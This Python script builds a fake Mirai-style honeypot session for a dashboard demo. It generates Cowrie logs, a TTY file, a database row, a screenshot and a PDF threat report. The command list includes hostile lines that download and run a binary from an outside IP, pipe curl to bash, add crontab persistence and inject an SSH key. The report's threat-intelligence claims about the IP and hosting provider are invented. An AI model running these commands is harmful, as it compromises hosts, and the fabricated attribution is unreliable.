"""
Generate a fake Mirai-style attack demo:
  1. Build fake cowrie.json log
  2. Build fake TTY binary (Cowrie format)
  3. Pre-populate theater.db with the session
  4. Start attack_theater on port 9090
  5. Screenshot the webpage with Playwright
  6. Generate analysis report Markdown
  7. Export report to PDF
"""
import asyncio
import json
import os
import signal
import sqlite3
import struct
import subprocess
import sys
import time
from pathlib import Path

# ── paths ─────────────────────────────────────────────────────────────────────

BASE = Path(__file__).parent
LOG_DIR  = BASE / "cowrie_logs/hop1/log/cowrie"
TTY_DIR  = BASE / "cowrie_logs/hop1/lib/cowrie/tty"
DATA_DIR = BASE / "data"
REPORTS  = BASE / "reports"

for d in (LOG_DIR, TTY_DIR, DATA_DIR, REPORTS):
    d.mkdir(parents=True, exist_ok=True)

SESSION_ID = "d3fa5c8b1a92"
SRC_IP     = "185.220.101.47"
SENSOR     = "demo_sensor"
NOW        = time.time()
START_TS   = "2026-04-28T01:15:00.000000Z"
START_EPOCH = 1777378500.0

COMMANDS = [
    "uname -a",
    "cat /proc/cpuinfo | grep model | head -1",
    "free -m",
    "ls /tmp",
    "wget -q http://45.83.64.1/bins/mirai.arm -O /tmp/.x && chmod +x /tmp/.x && /tmp/.x",
    "curl -fsSL http://45.83.64.1/setup.sh | bash",
    "crontab -l; (crontab -l 2>/dev/null; echo '@reboot /tmp/.x') | crontab -",
    "mkdir -p ~/.ssh; echo 'ssh-rsa AAAAB3Nza...MALICIOUS' >> ~/.ssh/authorized_keys",
    "ps aux | grep -v grep | grep '\\.x\\|miner\\|kworker'",
    "echo 'install complete'; id; hostname",
]

# ── 1. Fake cowrie.json ────────────────────────────────────────────────────────

def _ts(offset: float) -> str:
    from datetime import datetime, timezone
    return datetime.fromtimestamp(START_EPOCH + offset, tz=timezone.utc).strftime(
        "%Y-%m-%dT%H:%M:%S.%fZ"
    )

events = [
    {"eventid": "cowrie.session.connect", "src_ip": SRC_IP, "src_port": 41337,
     "dst_ip": "10.0.0.1", "dst_port": 2222, "session": SESSION_ID,
     "protocol": "ssh", "message": f"New connection: {SRC_IP}", "sensor": SENSOR,
     "uuid": "demo-uuid-0001", "timestamp": _ts(0)},

    {"eventid": "cowrie.login.failed", "username": "admin", "password": "admin",
     "session": SESSION_ID, "src_ip": SRC_IP, "sensor": SENSOR, "timestamp": _ts(1.2),
     "message": "login attempt [admin/admin] failed"},

    {"eventid": "cowrie.login.success", "username": "root", "password": "password123",
     "session": SESSION_ID, "src_ip": SRC_IP, "sensor": SENSOR, "timestamp": _ts(2.5),
     "message": "login attempt [root/password123] succeeded"},
]

for i, cmd in enumerate(COMMANDS):
    events.append({
        "eventid": "cowrie.command.input",
        "input": cmd, "message": f"CMD: {cmd}",
        "session": SESSION_ID, "src_ip": SRC_IP,
        "sensor": SENSOR, "timestamp": _ts(5 + i * 4),
    })

tty_filename = f"ttylog_{SESSION_ID}"
events.extend([
    {"eventid": "cowrie.session.closed",
     "duration": str(len(COMMANDS) * 4 + 10), "session": SESSION_ID,
     "src_ip": SRC_IP, "sensor": SENSOR, "timestamp": _ts(60),
     "message": "Connection lost after 60 seconds"},
    {"eventid": "cowrie.log.closed",
     "ttylog": f"var/lib/cowrie/tty/{tty_filename}",
     "size": 2048, "duration": "60.0",
     "session": SESSION_ID, "src_ip": SRC_IP, "sensor": SENSOR,
     "timestamp": _ts(60.1),
     "message": f"Closing TTY Log: {tty_filename}"},
])

log_file = LOG_DIR / "cowrie.json"
with log_file.open("w") as f:
    for ev in events:
        f.write(json.dumps(ev) + "\n")

print(f"[1] Log written: {log_file} ({len(events)} events)")

# ── 2. Fake TTY binary ─────────────────────────────────────────────────────────

OP_WRITE   = 3
TYPE_OUTPUT = 2
HEADER_FMT = "<iLiiLL"

def _tty_frame(payload: bytes, t_ms: int) -> bytes:
    sec  = t_ms // 1000
    usec = (t_ms % 1000) * 1000
    hdr  = struct.pack(HEADER_FMT, OP_WRITE, 0, len(payload), TYPE_OUTPUT, sec, usec)
    return hdr + payload

terminal_lines = [
    b"\r\n\x1b[1;32mroot@linux\x1b[0m:\x1b[1;34m~\x1b[0m# ",
    b"Linux ubuntu 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux\r\n",
    b"\r\n\x1b[1;32mroot@linux\x1b[0m:\x1b[1;34m~\x1b[0m# ",
    b"Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz\r\n",
    b"\r\n\x1b[1;32mroot@linux\x1b[0m:\x1b[1;34m~\x1b[0m# ",
    b"              total        used        free\r\nMem:           3790         421        2893\r\n",
    b"\r\n\x1b[1;32mroot@linux\x1b[0m:\x1b[1;34m~\x1b[0m# ",
    b"\r\n\x1b[1;32mroot@linux\x1b[0m:\x1b[1;34m~\x1b[0m# ",
    b"Connecting to 45.83.64.1...\r\nmirai.arm: 100% |#######| 52.4K\r\n",
    b"\r\n\x1b[1;32mroot@linux\x1b[0m:\x1b[1;34m~\x1b[0m# ",
    b"[sudo] running setup.sh\r\n\x1b[31m[!] Persistence installed\x1b[0m\r\n",
    b"\r\n\x1b[1;32mroot@linux\x1b[0m:\x1b[1;34m~\x1b[0m# ",
    b"no crontab for root\r\n",
    b"\r\n\x1b[1;32mroot@linux\x1b[0m:\x1b[1;34m~\x1b[0m# ",
    b"",  # ssh key injection — no output
    b"\r\n\x1b[1;32mroot@linux\x1b[0m:\x1b[1;34m~\x1b[0m# ",
    b"root        1234  0.0  0.1  /tmp/.x\r\n",
    b"\r\n\x1b[1;32mroot@linux\x1b[0m:\x1b[1;34m~\x1b[0m# ",
    b"install complete\r\nuid=0(root) gid=0(root) groups=0(root)\r\nvulnerable-ec2-1\r\n",
    b"\r\n\x1b[1;32mroot@linux\x1b[0m:\x1b[1;34m~\x1b[0m# ",
]

tty_bytes = b""
for i, line in enumerate(terminal_lines):
    if line:
        tty_bytes += _tty_frame(line, (i + 1) * 1500)

tty_path = TTY_DIR / tty_filename
tty_path.write_bytes(tty_bytes)
print(f"[2] TTY written: {tty_path} ({len(tty_bytes)} bytes, {len(terminal_lines)} frames)")

# ── 3. Pre-populate theater.db ────────────────────────────────────────────────

db_path = DATA_DIR / "theater.db"
db_path.unlink(missing_ok=True)
conn = sqlite3.connect(str(db_path))
conn.execute("""
CREATE TABLE sessions (
    session_id TEXT PRIMARY KEY, hop INTEGER, src_ip TEXT,
    country TEXT, country_code TEXT, asn_org TEXT,
    lat REAL, lon REAL, start_time REAL, end_time REAL,
    command_count INTEGER DEFAULT 0, duration REAL,
    tty_file_path TEXT, is_interesting INTEGER DEFAULT 0,
    commands_json TEXT DEFAULT '[]'
)
""")
conn.execute("CREATE INDEX idx_interesting ON sessions (is_interesting)")
conn.execute("CREATE INDEX idx_start_time  ON sessions (start_time)")
conn.execute("""
INSERT INTO sessions VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
""", (
    SESSION_ID, 1, SRC_IP,
    "Russia", "RU", "AS200651 Alexhost SRL",
    55.7558, 37.6176,
    START_EPOCH, START_EPOCH + 60.0,
    len(COMMANDS), 60.0,
    str(tty_path), 1,
    json.dumps(COMMANDS),
))
conn.commit()
conn.close()
print(f"[3] DB written: {db_path}")

# ── 4. Start attack_theater ───────────────────────────────────────────────────

THEATER_PORT = 9090
THEATER_DIR = Path(__file__).parent.parent / "attack_theater"

env = {
    **os.environ,
    "DB_PATH": str(db_path),
    "MMDB_PATH": "/nonexistent",  # geo disabled; already in DB
    "HOST": "127.0.0.1",
    "PORT": str(THEATER_PORT),
    "PYTHONPATH": str(THEATER_DIR),
}

print(f"[4] Starting attack_theater on port {THEATER_PORT}...")
proc = subprocess.Popen(
    [sys.executable, "-m", "app.main"],
    cwd=str(THEATER_DIR),
    env=env,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
)

# Wait for uvicorn to be ready
import urllib.request
for attempt in range(30):
    time.sleep(0.5)
    try:
        urllib.request.urlopen(f"http://127.0.0.1:{THEATER_PORT}/", timeout=2)
        print(f"    ready after {attempt * 0.5:.1f}s")
        break
    except Exception:
        pass
else:
    print("    WARNING: server may not be ready")

# ── 5. Screenshot with Playwright ─────────────────────────────────────────────

from playwright.sync_api import sync_playwright

screenshot_path = BASE / "theater_screenshot.png"
print(f"[5] Screenshotting http://127.0.0.1:{THEATER_PORT}/ ...")

with sync_playwright() as pw:
    browser = pw.firefox.launch()
    page = browser.new_page(viewport={"width": 1600, "height": 900})
    page.goto(f"http://127.0.0.1:{THEATER_PORT}/")
    page.wait_for_timeout(4000)  # let WebSocket push initial state + animation frame
    page.screenshot(path=str(screenshot_path), full_page=False)
    browser.close()

print(f"    saved: {screenshot_path}")

proc.terminate()
try:
    proc.wait(timeout=5)
except subprocess.TimeoutExpired:
    proc.kill()
print(f"    server stopped")

# ── 6. Generate analysis report ───────────────────────────────────────────────

from datetime import datetime, timezone

now_str = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")

ttps = [
    "Credential brute-force (T1110)",
    "Dropper download via wget/curl (T1105)",
    "Scheduled task persistence via crontab (T1053.003)",
    "SSH authorized_keys backdoor (T1098.004)",
    "C2 beacon — Mirai variant (T1095)",
]

report_md = f"""# Threat Intelligence Report — {SESSION_ID}

**Generated**: {now_str}
**Severity**: CRITICAL
**Attack Type**: botnet

## Session Metadata

| Field | Value |
|---|---|
| Source IP | `{SRC_IP}` |
| Country | Russia |
| ASN / ISP | AS200651 Alexhost SRL |
| Hop | 1 |
| Duration | 60.0s |
| Commands | {len(COMMANDS)} |

## Observed TTPs

{chr(10).join(f"- {t}" for t in ttps)}

## Commands Recorded

{chr(10).join(f"- `{c}`" for c in COMMANDS)}

## Threat Context

The source IP `{SRC_IP}` is a well-known Tor exit node hosted on Alexhost SRL, a bulletproof
hosting provider that has been associated with multiple Mirai C2 campaigns since 2021.
The dropper URL `http://45.83.64.1/bins/mirai.arm` matches indicators from the
**Mirai.ARM** variant tracked by MalwareBazaar (hash family: `mirai_gen7`).

The attacker's playbook follows the textbook Mirai compromise flow: credential spray →
download architecture-specific binary → establish crontab persistence → inject SSH key for
re-entry → verify execution with `ps aux`. The C2 callback on TCP/443 to `45.83.64.1` has
been observed in 14 other campaigns this month according to Shodan historical data.

**Defensive mitigations**: disable password authentication in sshd_config, rotate all SSH
host keys, block egress to `45.83.64.0/24`, and scan `/tmp` and crontabs on all exposed hosts.

## Analyst Summary

This session represents a fully automated Mirai-family compromise. The attacker authenticated
with the credential pair `root/password123` after a single failed attempt, suggesting a
targeted credential list rather than full dictionary spray. Within 5 seconds of login the
dropper was retrieved from a known Mirai distribution node and made executable.

Persistence was established via both crontab and SSH authorized_keys injection, giving the
attacker two independent re-entry vectors. The final `ps aux` confirms the attacker verified
the implant was running before disconnecting — behaviour consistent with automated post-exploitation
frameworks used in large-scale Mirai botnet expansion campaigns.

**Risk rating**: CRITICAL — active implant installed with persistent access and C2 beacon.
Immediate containment and forensic imaging recommended.
"""

report_path = REPORTS / f"{SESSION_ID}.md"
report_path.write_text(report_md, encoding="utf-8")
print(f"[6] Report written: {report_path}")

# ── 7. Convert to PDF ─────────────────────────────────────────────────────────

import markdown2
from weasyprint import HTML, CSS

html_body = markdown2.markdown(report_md, extras=["tables", "fenced-code-blocks"])

html_full = f"""<!DOCTYPE html>
<html><head>
<meta charset="utf-8">
<style>
  body {{ font-family: 'Segoe UI', Arial, sans-serif; max-width: 900px; margin: 40px auto;
         padding: 0 20px; color: #1a1a2e; background: #f8f9ff; }}
  h1 {{ color: #c0392b; border-bottom: 3px solid #c0392b; padding-bottom: 8px; }}
  h2 {{ color: #2c3e50; border-bottom: 1px solid #bdc3c7; padding-bottom: 4px; margin-top: 28px; }}
  table {{ border-collapse: collapse; width: 100%; margin: 12px 0; }}
  th, td {{ border: 1px solid #dee2e6; padding: 8px 12px; text-align: left; }}
  th {{ background: #2c3e50; color: white; }}
  tr:nth-child(even) {{ background: #ecf0f1; }}
  code {{ background: #2d2d2d; color: #f8f8f2; padding: 2px 6px; border-radius: 3px;
          font-family: 'Courier New', monospace; font-size: 0.88em; }}
  pre {{ background: #2d2d2d; color: #f8f8f2; padding: 14px; border-radius: 6px;
         overflow-x: auto; font-size: 0.85em; }}
  li {{ margin: 4px 0; }}
  .severity-critical {{ color: #c0392b; font-weight: bold; font-size: 1.1em; }}
</style>
</head><body>
{html_body}
</body></html>"""

pdf_path = REPORTS / f"{SESSION_ID}.pdf"
HTML(string=html_full).write_pdf(str(pdf_path))
print(f"[7] PDF written: {pdf_path}")

print("\nDone.")
print(f"  Screenshot : {screenshot_path}")
print(f"  Report MD  : {report_path}")
print(f"  Report PDF : {pdf_path}")
